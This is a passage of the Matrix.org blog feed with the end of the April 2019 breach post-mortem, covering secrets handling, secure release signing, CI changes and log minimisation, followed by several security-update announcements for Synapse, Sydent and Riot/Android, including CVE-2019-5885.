&lt;p&gt;One of the major flaws once the attacker was in our network was that our internal configuration git repo was cloned on most accounts on most servers, containing within it a plethora of unencrypted secrets.  Config would then get symlinked from the checkout to wherever the app or OS needed it.&lt;&#x2F;p&gt;
&lt;p&gt;This is bad in terms of leaving unencrypted secrets (database passwords, API keys etc) lying around everywhere, but also in terms of being able to automatically maintain configuration and spot unauthorised configuration changes.&lt;&#x2F;p&gt;
&lt;p&gt;Our solution is to switch all configuration management, from the OS upwards, to Ansible (which we had already established for Modular.im), using Ansible vaults to store the encrypted secrets.  It’s unfortunate that we had already done the work for this (and even had been &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ansible-community&#x2F;ansible-london-meetup&#x2F;blob&#x2F;master&#x2F;presentations&#x2F;2019-01-31&#x2F;Introducing%20Ansible%20to%20matrix-final.pdf&quot;&gt;giving talks at Ansible meetups&lt;&#x2F;a&gt; about it!) but had not yet applied it to the legacy infrastructure.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;avoiding-temporary-measures-which-last-forever&quot;&gt;Avoiding temporary measures which last forever&lt;&#x2F;h4&gt;
&lt;p&gt;None of this would have happened had we been more disciplined in finishing off the temporary infrastructure from back in 2017.  As a general point, we should try and do it right the first time - and failing that, assign responsibility to someone to update it and assign responsibility to someone else to check. In other words, the only way to dig out of temporary measures like this is to project manage the update or it will not happen.  This is of course a general point not specific to this incident, but one well worth reiterating.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;secure-packaging&quot;&gt;Secure packaging&lt;&#x2F;h4&gt;
&lt;p&gt;One of the most unfortunate mistakes highlighted by the breach is that the signing keys for the Synapse debian repository, Riot debian repository and Riot&#x2F;Android releases on the Google Play Store had ended up on hosts which were compromised during the attack.  This is obviously a massive fail, and is a case of the geo-distributed dev teams prioritising the convenience of a near-automated release process without thinking through the security risks of storing keys on a production server.&lt;&#x2F;p&gt;
&lt;p&gt;Whilst the keys were compromised, none of the packages that we distribute were tampered with. However, the impact on the project has been high - particularly for Riot&#x2F;Android, as we cannot allow the risk of an attacker using the keys to sign and somehow distribute malicious variants of Riot&#x2F;Android, and Google provides no means of recovering from a compromised signing key beyond creating a whole new app and starting over.  Therefore we have lost all our ratings, reviews and download counts on Riot&#x2F;Android and &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-im-android-security-update-2b3f655ad739&quot;&gt;started over&lt;&#x2F;a&gt;.  (If you want to give the newly released app a fighting chance despite this setback, feel free to &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=im.vector.app&amp;amp;showAllReviews=true&quot;&gt;give it some stars&lt;&#x2F;a&gt; on the Play Store). We also revoked the compromised Synapse &amp;amp; Riot GPG keys and created new ones (and published &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;95c603ae6f0f1639f6299fff62d7a75002221276#diff-7d442b7eb49f5fc377f51e74b291cfc1&quot;&gt;new instructions&lt;&#x2F;a&gt; for how to securely set up your Synapse or Riot debian repos).&lt;&#x2F;p&gt;
&lt;p&gt;In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).&lt;&#x2F;li&gt;
&lt;li&gt;We then perform all releases from a dedicated isolated release terminal.
&lt;ul&gt;
&lt;li&gt;This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.&lt;&#x2F;li&gt;
&lt;li&gt;Needless to say, the device is strictly used for &lt;em&gt;nothing&lt;&#x2F;em&gt; other than performing releases.&lt;&#x2F;li&gt;
&lt;li&gt;The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)&lt;&#x2F;li&gt;
&lt;li&gt;The signing keys (hardware or software) are kept exclusively on this device.&lt;&#x2F;li&gt;
&lt;li&gt;The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.&lt;&#x2F;li&gt;
&lt;li&gt;We physically store the device securely.&lt;&#x2F;li&gt;
&lt;li&gt;We ensure someone on the team always has physical access to it in order to do emergency builds.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
&lt;ul&gt;
&lt;li&gt;These live at &lt;a href=&quot;https:&#x2F;&#x2F;packages.matrix.org&quot;&gt;https:&#x2F;&#x2F;packages.matrix.org&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;packages.riot.im&quot;&gt;https:&#x2F;&#x2F;packages.riot.im&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;These are minimal machines with nothing but a static web-server.&lt;&#x2F;li&gt;
&lt;li&gt;They are accessed only via the dedicated SSH keys stored on the release terminal.&lt;&#x2F;li&gt;
&lt;li&gt;These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare’s &lt;a href=&quot;https:&#x2F;&#x2F;www.cloudflare.com&#x2F;always-online&#x2F;&quot;&gt;always online&lt;&#x2F;a&gt; feature, for better or worse).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Alternatives here included:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;In an ideal world we’d do reproducible builds instead, and sign the build’s hash with a hardware key, but given we don’t have reproducible builds yet this will have to suffice for now.&lt;&#x2F;li&gt;
&lt;li&gt;We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;370&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;370&lt;&#x2F;a&gt;).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;dev-and-ci-infrastructure&quot;&gt;Dev and CI infrastructure&lt;&#x2F;h4&gt;
&lt;p&gt;The main change in our dev and CI infrastructure is to move from Jenkins to &lt;a href=&quot;https:&#x2F;&#x2F;buildkite.com&#x2F;matrix-dot-org&quot;&gt;Buildkite&lt;&#x2F;a&gt;.  The latter has been serving us well for Synapse builds over the last few months, and has now been extended to serve all the main CI pipelines that Jenkins was providing.  Buildkite works by orchestrating jobs on a elastic pool of CI workers we host in our own AWS, and so far has done so quite painlessly.&lt;&#x2F;p&gt;
&lt;p&gt;The new pipelines have been set up so that where CI needs to push artefacts to production for continuous deployment (e.g. &lt;a href=&quot;riot.im&#x2F;develop&quot;&gt;riot.im&#x2F;develop&lt;&#x2F;a&gt;), it does so by poking production via HTTPS to trigger production to pull the artefact from CI, rather than pushing the artefact via SSH to production.&lt;&#x2F;p&gt;
&lt;p&gt;Other than CI, our strategy is:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Continue using Github for public repositories&lt;&#x2F;li&gt;
&lt;li&gt;Use gitlab.matrix.org for private repositories (and stuff which we don’t want to re-export via the US, like &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&quot;&gt;Olm&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Continue to host docker images on Docker Hub (despite their recent &lt;a href=&quot;https:&#x2F;&#x2F;success.docker.com&#x2F;article&#x2F;docker-hub-user-notification&quot;&gt;security dramas&lt;&#x2F;a&gt;).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;log-minimisation-and-handling-personally-identifying-information-pii&quot;&gt;Log minimisation and handling Personally Identifying Information (PII)&lt;&#x2F;h4&gt;
&lt;p&gt;Another thing that the breach made painfully clear is that we log too much.  While there’s not much evidence of the attacker going spelunking through any Matrix service log files, the fact is that whilst developing Matrix we’ve kept logging on matrix.org relatively verbose to help with debugging.  There’s nothing more frustrating than trying to trace through the traffic for a bug only to discover that logging didn’t pick it up.&lt;&#x2F;p&gt;
&lt;p&gt;However, we can still improve our logging and PII-handling substantially:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).&lt;&#x2F;li&gt;
&lt;li&gt;Minimising log retention to the bare minimum we need to investigate recent issues and abuse&lt;&#x2F;li&gt;
&lt;li&gt;Ensuring that PII is stored hashed wherever possible.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;policies&#x2F;tree&#x2F;master&#x2F;docs&#x2F;matrix-org&quot;&gt;privacy policies&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;05&#x2F;08&#x2F;gdpr-compliance-in-matrix&#x2F;&quot;&gt;GDPR work&lt;&#x2F;a&gt;), but there is also more we can do, particularly:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what’s going on.  This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5145&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5145&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1763&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1763&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1228&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1228&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h3&gt;
&lt;p&gt;Hopefully this gives a comprehensive overview of what happened in the breach, how we handled it, and what we are doing to protect against this happening in future.&lt;&#x2F;p&gt;
&lt;p&gt;Again, we’d like to apologise for the massive inconvenience this caused to everyone caught in the crossfire. Thank you for your patience and for sticking with the project whilst we restored systems. And while it is very unfortunate that we ended up in this situation, at least we should be coming out of it much stronger, at least in terms of infrastructure security.  We’d also like to particularly thank &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;kade-morton-34179283&#x2F;&quot;&gt;Kade Morton&lt;&#x2F;a&gt; for providing independent review of this post and our remediations, and everyone who reached out with #hugops during the incident (it was literally the only positive thing we had on our radar), and finally thanks to the those of the Matrix team who hauled ass to rebuild the infrastructure, and also those who doubled down meanwhile to keep the rest of the project on track.&lt;&#x2F;p&gt;
&lt;p&gt;On which note, we’re going to go back to building decentralised communication protocols and reference implementations for a bit...  Emoji reactions are on the horizon (at last!), as is Message Editing, RiotX&#x2F;Android and a host of other long-awaited features - not to mention finally releasing Synapse 1.0.  So: thanks again for flying Matrix, even during this period of extreme turbulence and, uh, hijack.  Things should mainly be back to normal now and for the foreseeable.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;Given the new blog doesn&#x27;t have comments yet, feel free to discuss the post over at &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=19857744&quot;&gt;HN&lt;&#x2F;a&gt;.&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a</title>
		<published>2019-05-03T00:00:00+00:00</published>
		<updated>2019-05-03T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a/" type="text/html"/>
		<id>/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a/</id>
		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Over the last few weeks we’ve ended up getting a lot of attention from the security research community, which has been incredibly useful and massively appreciated in terms of contributions to improve the security of the reference Matrix implementations.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve also set up an official &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security Disclosure Policy&lt;&#x2F;a&gt; to explain the process of reporting security issues to us safely via responsible disclosure - including a Hall of Fame to credit those who have done so.  (Please mail &lt;a href=&quot;mailto:security@matrix.org&quot;&gt;security@matrix.org&lt;&#x2F;a&gt; to remind us if we’ve forgotten you!).&lt;&#x2F;p&gt;
&lt;p&gt;Since we published the Hall of Fame yesterday, we’ve already been getting new entries and so we’re doing a set of security releases today to ensure they are mitigated asap.  Unfortunately the work around this means that we’re running late in publishing the post mortem of the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&quot;&gt;Apr 11 security incident&lt;&#x2F;a&gt; - we are trying to get that out as soon as we can.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sydent-1-0-3&quot;&gt;Sydent 1.0.3&lt;&#x2F;h2&gt;
&lt;p&gt;Sydent 1.0.3 has three security fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that authentication tokens are generated using a secure random number generator, ensuring they cannot be predicted by an attacker.  This is an important fix - please update.  Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing the issue!&lt;&#x2F;li&gt;
&lt;li&gt;Mitigate an HTML injection bug where an invalid room_id could result in malicious HTML being injected into validation emails.  &lt;strong&gt;The fix for this is in the email template itself; you will need to update any customised email templates to be protected.&lt;&#x2F;strong&gt;  Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue too!&lt;&#x2F;li&gt;
&lt;li&gt;Randomise session_ids to avoid leaking info about the total number of identity validations, and whether a given ID has been validated.  Thanks to &lt;a href=&quot;https:&#x2F;&#x2F;fs0c131y.com&quot;&gt;@fs0c131y&lt;&#x2F;a&gt; for identifying and responsibly disclosing this one.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;If you are running Sydent as an identity server, you should update as soon as possible from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;v1.0.3&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;v1.0.3&lt;&#x2F;a&gt;.  We are not aware of any of these issues having been exploited maliciously in the wild.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;synapse-0-99-3-1&quot;&gt;Synapse 0.99.3.1&lt;&#x2F;h2&gt;
&lt;p&gt;Synapse 0.99.3.1 is a security update for two fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that random IDs in Synapse are generated using a secure random number generator, ensuring they cannot be predicted by an attacker. Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue!&lt;&#x2F;li&gt;
&lt;li&gt;Add 0.0.0.0&#x2F;32 and ::&#x2F;128 to the URL preview blacklist configuration, ensuring that an attacker cannot make connections to localhost. Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue too!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;You can update from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&lt;&#x2F;a&gt; or similar as normal. We are not aware of any of these issues having been exploited maliciously in the wild.&lt;&#x2F;p&gt;
&lt;p&gt;(Synapse 0.99.3.2 was released shortly afterwards to fix a non-security issue with the Debian packaging)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;riot-android-0-9-x-0-8-99-google-play-and-0-8-28a-f-droid&quot;&gt;Riot&#x2F;Android 0.9.x&#x2F;0.8.99 (Google Play) and 0.8.28a (F-Droid)&lt;&#x2F;h2&gt;
&lt;p&gt;Riot&#x2F;Android has an important security fix which shipped over the course of the last week in various versions of the app:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Remove obsolete and buggy ContentProvider which could allow a malicious local app to compromise account data. Many thanks to Julien Thomas (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@julien_thomas&quot;&gt;@julien_thomas&lt;&#x2F;a&gt;) from &lt;a href=&quot;https:&#x2F;&#x2F;protektoid.com&quot;&gt;Protektoid Project&lt;&#x2F;a&gt; for identifying this and responsibly disclosing it!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The fix for this shipped on F-Droid since 0.8.28a, and on the Play Store, the fix is present in both v0.9.0 (the first version of the re-published Riot app) and v0.8.99 (the last version of the old Riot app, which told everyone to reinstall).  Other forks of Riot which we’re aware of have also been informed and should be updated.&lt;&#x2F;p&gt;
&lt;p&gt;If you haven’t already updated, please do so now.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Further details on Critical Security Update in Synapse affecting all versions prior to 0.34.1 (CVE-2019-5885)</title>
		<published>2019-01-15T00:00:00+00:00</published>
		<updated>2019-01-15T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2019/01/15/further-details-on-critical-security-update-in-synapse-affecting-all-versions-prior-to-0-34-1-cve-2019-5885/" type="text/html"/>
		<id>/blog/2019/01/15/further-details-on-critical-security-update-in-synapse-affecting-all-versions-prior-to-0-34-1-cve-2019-5885/</id>
		<content type="html">&lt;p&gt;On &lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;01&#x2F;10&#x2F;critical-security-update-synapse-0-34-0-1-synapse-0-34-1-1&#x2F;&quot;&gt;Thursday Jan 10th we released a Critical Security Update (Synapse 0.34.0.1&#x2F;0.34.1.1)&lt;&#x2F;a&gt;, which fixes a serious security bug in Synapse 0.34.0 and earlier. Many deployments have now upgraded to 0.34.0.1 or 0.34.1.1, and we now consider it appropriate to disclose more information about the issue, to provide context and &lt;b&gt;encourage the remaining affected servers to upgrade as soon as possible&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;In Synapse 0.11 (Nov 2015) we added a configuration parameter called “macaroon_secret_key” which relates to our use of &lt;a href=&quot;https:&#x2F;&#x2F;ai.google&#x2F;research&#x2F;pubs&#x2F;pub41892&quot;&gt;macaroons&lt;&#x2F;a&gt; in authentication. Macaroons are authentication tokens which must be signed by the server which generates them, to prevent them being forged by attackers. “macaroon_secret_key” defines the key which is used for this signature, and it must therefore be kept secret to preserve the security of the server.&lt;&#x2F;p&gt;
&lt;p&gt;If the option is not set, Synapse will attempt to derive a secret key from other secrets specified in the configuration file. However, in all versions of Synapse up to and including 0.34.0, this process was faulty and a predictable value was used instead.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;So if, your homeserver.yaml does not contain a macaroon_secret_key, you need to upgrade to 0.34.1.1 or 0.34.0.1 or Debian 0.34.0-3~bpo9+2 immediately to prevent the risk of account hijacking.&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The vulnerability affects any Synapse installation which does not have a macaroon_secret_key setting. &lt;b&gt;For example, the Debian and Ubuntu packages from Matrix.org, Debian and Ubuntu include a configuration file without an explicit macaroon_secret_key and must upgrade. &lt;&#x2F;b&gt;Anyone who hasn&#x27;t updated their config since Nov 2015 or who grandfathered their config from the Debian&#x2F;Ubuntu packages will likely also be affected.&lt;&#x2F;p&gt;
&lt;p&gt;We are not aware of this vulnerability being exploited in the wild, but if you are running an affected server it may still be wise to check your synapse&#x27;s user_ips database table for any unexpected access to your server&#x27;s accounts. You could also check your accounts&#x27; device lists (shown under Settings in Riot) for unexpected devices, although this is not as reliable as an attacker could cover their tracks to remove unexpected devices.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ll publish a full post-mortem of the issue once we are confident that most affected servers have been upgraded.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d like to apologise for the inconvenience caused by this - especially to folks who upgraded since Friday who were in practice not affected. Due to the nature of the issue we wanted to minimise details about the issue until people had a chance to upgrade. We also did not follow a planned disclosure procedure because Synapse 0.34.1 already unintentionally disclosed the existence of the bug by fixing it (causing the logout bug for affected users which led us to pull the original Synapse 0.34.1 release).&lt;&#x2F;p&gt;
&lt;p&gt;On the plus side, we are approaching the end of beta for Synapse, and going forwards hope to see much better stability and security across the board.&lt;&#x2F;p&gt;
&lt;p&gt;Thanks again for your patience,&lt;&#x2F;p&gt;
&lt;p&gt;The Matrix.org Team&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Critical Security Update: Synapse 0.34.0.1&#x2F;Synapse 0.34.1.1</title>
		<published>2019-01-10T00:00:00+00:00</published>
		<updated>2019-01-10T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2019/01/10/critical-security-update-synapse-0-34-0-1-synapse-0-34-1-1/" type="text/html"/>
		<id>/blog/2019/01/10/critical-security-update-synapse-0-34-0-1-synapse-0-34-1-1/</id>
		<content type="html">&lt;p&gt;After releasing Synapse v0.34.1, we have become aware of a security vulnerability affecting all previous versions (&lt;a href=&quot;http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2019-5885&quot;&gt;CVE-2019-5885&lt;&#x2F;a&gt;). v0.34.1 closed the vulnerability but, in some cases, caused users to be logged out of their clients, so we do not recommend v0.34.1 for production use.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Today we release two mitigating versions v0.34.0.1 and v0.34.1.1&lt;&#x2F;b&gt;. Both versions close the vulnerability and will not cause users to be logged out. &lt;b&gt;All installations should be upgraded to one or other immediately.&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Admins who would otherwise upgrade to v0.34.1 (or those that have already done so) should upgrade to v0.34.1.1. 
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Admins on v0.34.0, who do not wish to bring in new non-security related behaviour, should upgrade to v0.34.0.1.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;You can get the new updates for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.0.1&quot;&gt;v0.34.0.1&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.1.1&quot;&gt;v0.34.1.1&lt;&#x2F;a&gt; here or any of the sources mentioned at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;. Note, Synapse is now available from PyPI, pick it up &lt;a href=&quot;https:&#x2F;&#x2F;pypi.org&#x2F;project&#x2F;matrix-synapse&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;. See also our &lt;a href=&quot;&#x2F;docs&#x2F;guides&#x2F;installing-synapse&quot;&gt;Synapse installation guide page.&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We will publish more details of the vulnerability once admins have had a chance to upgrade. To our knowledge the vulnerability has not been exploited in the wild.&lt;&#x2F;p&gt;
&lt;p&gt;Many thanks for your patience, we are moving ever closer to Synapse reaching v1.0, and fixes like this one edge us ever closer.&lt;&#x2F;p&gt;
&lt;p&gt;Thanks also to the package maintainers who have coordinated with us to ensure distro packages are available for a speedy upgrade!&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.0.1&quot;&gt;Synapse v0.34.0.1 Changelog&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.1.1&quot;&gt;Synapse v0.34.1.1 Changelog&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Critical Security Update: Synapse 0.33.3.1</title>
		<published>2018-09-06T00:00:00+00:00</published>
		<updated>2018-09-06T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2018/09/06/critical-security-update-synapse-0-33-3-1/" type="text/html"/>
		<id>/blog/2018/09/06/critical-security-update-synapse-0-33-3-1/</id>
		<content type="html">&lt;p&gt;Hi All,&lt;&#x2F;p&gt;
&lt;p&gt;As referenced in yesterday&#x27;s &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;09&#x2F;05&#x2F;pre-disclosure-upcoming-critical-security-fix-for-synapse&#x2F;&quot;&gt;pre-disclosure&lt;&#x2F;a&gt;, today we are releasing Synapse 0.33.3.1 as a critical security update.&lt;&#x2F;p&gt;
&lt;p&gt;We have patched two security vulnerabilities we identified whilst working on the upcoming r0 spec release for the Server-Server API (see details below). We do not believe either have been exploited in the wild, but strongly recommend everybody running a federated Synapse upgrades immediately. &lt;&#x2F;p&gt;
&lt;p&gt;As always you can get the new update &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.33.3.1&quot;&gt;here&lt;&#x2F;a&gt; or from any of the sources mentioned at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Many thanks for your patience and understanding; with fixes like this we are moving ever closer to Synapse reaching a 1.0 Thanks also to the package maintainers who have coordinated with us to ensure distro packages are available for a speedy upgrade!&lt;&#x2F;p&gt;
&lt;p&gt;Note, for anyone running Debian Jessie, we have prepared a 0.33.2.1 deb (as 0.33.3 dropped support for Jessie).&lt;&#x2F;p&gt;
&lt;p&gt; &lt;&#x2F;p&gt;
&lt;h3&gt;Synapse 0.33.3.1 (2018-09-06)&lt;&#x2F;h3&gt;
&lt;h4&gt;SECURITY FIXES&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;Fix an issue where event signatures were not always correctly validated (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3796&quot;&gt;#3796&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix an issue where server_acls could be circumvented for incoming events (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3796&quot;&gt;#3796&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4&gt;Internal Changes&lt;&#x2F;h4&gt;
&lt;ul&gt;
 	&lt;li&gt;Unignore synctl in .dockerignore to fix docker builds (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3802&quot;&gt;#3802&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
